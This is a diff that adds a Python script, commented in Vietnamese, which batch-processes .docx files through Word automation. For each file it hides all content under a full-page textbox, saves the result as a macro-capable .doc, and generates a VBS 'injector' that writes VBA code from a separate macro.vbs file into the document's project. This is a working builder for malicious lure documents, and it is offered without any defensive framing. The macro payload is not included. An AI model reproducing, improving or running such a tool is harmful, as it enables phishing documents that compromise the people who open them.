@@ -1,0 +1,92 @@
+import os
+import win32com.client as win32
+
+def process_word_file(input_path, macro_vbs_path):
+    folder, filename = os.path.split(input_path)
+    name, ext = os.path.splitext(filename)
+    output_path = os.path.join(folder, name + ".doc")  # đổi thành .doc
+
+    word = win32.gencache.EnsureDispatch("Word.Application")
+    word.Visible = False
+
+    try:
+        # Mở file .docx
+        doc = word.Documents.Open(input_path)
+
+        # 1. Ẩn toàn bộ nội dung
+        rng = doc.Range()
+        rng.Font.Hidden = True
+
+        # 2. Thêm textbox full trang
+        page_w = doc.PageSetup.PageWidth
+        page_h = doc.PageSetup.PageHeight
+        left_margin = doc.PageSetup.LeftMargin
+        top_margin = doc.PageSetup.TopMargin
+        width = page_w - left_margin - doc.PageSetup.RightMargin
+        height = page_h - top_margin - doc.PageSetup.BottomMargin
+
+        shape = doc.Shapes.AddTextbox(
+            Orientation=1,  # msoTextOrientationHorizontal
+            Left=left_margin,
+            Top=top_margin,
+            Width=width,
+            Height=height
+        )
+        shape.TextFrame.TextRange.Text = "Test"
+        shape.Line.Visible = False
+        shape.TextFrame.HorizontalAnchor = 1
+        shape.TextFrame.VerticalAnchor = 3
+
+        # 3. Lưu lại dưới dạng .doc
+        doc.SaveAs(output_path, FileFormat=0)
+        print(f"[+] Đã xử lý: {output_path}")
+
+        doc.Close(SaveChanges=0)
+
+        # 4. Sinh file inject_xxx.vbs để chèn macro
+        if os.path.exists(macro_vbs_path):
+            with open(macro_vbs_path, "r", encoding="utf-8") as f:
+                macro_lines = f.readlines()
+
+            inject_file = os.path.join(folder, f"inject_{name}.vbs")
+            with open(inject_file, "w", encoding="utf-8") as f:
+                f.write('Set objWord = CreateObject("Word.Application")\n')
+                f.write('objWord.Visible = False\n')
+                f.write(f'Set objDoc = objWord.Documents.Open("{output_path}")\n')
+                f.write('Set vbComp = objDoc.VBProject.VBComponents.Add(1)\n')
+                for line in macro_lines:
+                    safe_line = line.rstrip().replace('"', '""')
+                    if safe_line.strip() != "":
+                        f.write(f'vbComp.CodeModule.AddFromString "{safe_line}"\n')
+                    else:
+                        f.write('vbComp.CodeModule.AddFromString vbCrLf\n')
+                f.write('objDoc.Save\n')
+                f.write('objDoc.Close\n')
+                f.write('objWord.Quit\n')
+
+            print(f"[+] Đã tạo VBS injector: {inject_file}")
+        else:
+            print("[!] Không tìm thấy macro.vbs")
+
+    except Exception as e:
+        print("Lỗi:", e)
+    finally:
+        try:
+            word.Quit(SaveChanges=0)
+        except:
+            pass
+
+
+if __name__ == "__main__":
+    current_dir = os.getcwd()
+    macro_file = os.path.join(current_dir, "macro.vbs")
+
+    # Lấy tất cả file .docx trong thư mục hiện tại
+    docx_files = [f for f in os.listdir(current_dir) if f.lower().endswith(".docx")]
+
+    if not docx_files:
+        print("[!] Không tìm thấy file .docx nào trong thư mục.")
+    else:
+        for docx in docx_files:
+            input_file = os.path.join(current_dir, docx)
+            process_word_file(input_file, macro_file)
